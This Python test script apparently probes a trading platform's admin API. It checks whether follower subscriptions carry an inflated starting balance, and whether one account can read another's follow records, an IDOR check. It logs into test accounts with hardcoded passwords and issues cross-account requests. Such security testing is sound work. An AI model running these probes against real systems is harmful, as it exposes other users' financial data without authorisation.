"""
BUG-32: Orphaned MAM "starting_balance" inflation — 
F1's MAM subscription still shows starting_balance = $1,000,000 (the master's inflated balance)
instead of the follower's actual $10,000. 
This means: HWM and profit-share calculations are based on a $1M starting balance, 
causing perpetual performance-fee immunity (follower never "profits" over the HWM of $1M on a $10K account).

Also tests BUG-33: MAM follow endpoint reveals IDOR — can follower A read follower B's subscription details?
"""
import requests, json

BASE_URL = "https://lpadmin.blackfx.com"

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_f1, h_f1 = make_session("mamf1@mailinator.com", "12345678")
s_f2, h_f2 = make_session("mamf2@mailinator.com", "12345678")
s_f3, h_f3 = make_session("mamf3@mailinator.com", "12345678")
s_m, h_m = make_session("mamm@mailinator.com", "12345678")

MASTER_ID = "mem_11434b0b9d9d210899"
F1_ID = "mem_0ea679062ffd38adf7"
F2_ID = "mem_87cc39bb4ddf52a026"
F3_ID = "mem_761e39f83d27137624"

print("=== BUG-32: MAM Starting Balance Inflation ===\n")
# Check all follower subscription data
for label, session, headers, fid in [
    ("F1", s_f1, h_f1, F1_ID),
    ("F2", s_f2, h_f2, F2_ID),
    ("F3", s_f3, h_f3, F3_ID),
]:
    follows = session.get(f"{BASE_URL}/v1/oms/real/mam/follows", headers=headers).json()
    funds = session.get(f"{BASE_URL}/v1/oms/real/positions", headers=headers).json().get("funds", {})
    
    print(f"\n{label} (ID: {fid})")
    print(f"  Actual balance: {funds.get('balance')}")
    
    following_list = follows.get("following", [])
    for sub in following_list:
        sb = sub.get("starting_balance")
        print(f"  Subscription starting_balance: {sb}")
        print(f"  Multiplier: {sub.get('multiplier')}")
        print(f"  Share percent: {sub.get('share_percent')}")
        
        if sb and funds.get("balance") and sb > funds.get("balance") * 2:
            print(f"  🚨 BUG-32: starting_balance ({sb}) is {sb/funds['balance']:.1f}x the actual balance ({funds['balance']})!")
            print(f"  Impact: HWM set at $1M for $10K account — performance fees can NEVER be charged!")

print("\n=== BUG-33: Cross-Follower Follow ID IDOR ===\n")
# F1's follow_id visible — can F2 access it?
f1_follows = s_f1.get(f"{BASE_URL}/v1/oms/real/mam/follows", headers=h_f1).json()
f1_follow_ids = [f.get("follow_id") for f in f1_follows.get("following", [])]
print(f"F1 follow IDs: {f1_follow_ids}")

for fid in f1_follow_ids:
    if fid:
        # Try F2 reading F1's follow details directly
        r_idor = s_f2.get(f"{BASE_URL}/v1/oms/real/mam/follows/{fid}", headers=h_f2)
        print(f"F2 accessing F1's follow {fid}: {r_idor.status_code} {r_idor.text[:200]}")
        if r_idor.status_code == 200:
            print("🚨 BUG-33 CONFIRMED: Cross-follower IDOR on MAM follow subscriptions!")
        
        # Try master reading follower's data
        r_master = s_m.get(f"{BASE_URL}/v1/oms/real/mam/follows/{fid}", headers=h_m)
        print(f"Master accessing F1's follow {fid}: {r_master.status_code} {r_master.text[:200]}")

# Try accessing follows list as master (should only see their own followers, not other masters)
master_follows = s_m.get(f"{BASE_URL}/v1/oms/real/mam/follows", headers=h_m)
print(f"\nMaster's follows view: {master_follows.status_code} {master_follows.text[:400]}")

# Can master see ALL followers in the system?
all_members_follows = s_m.get(f"{BASE_URL}/v1/oms/real/mam/follows?limit=100", headers=h_m)
print(f"Master bulk follows query: {all_members_follows.status_code} {all_members_follows.text[:400]}")

print("\nBUG-32/33 test complete.")
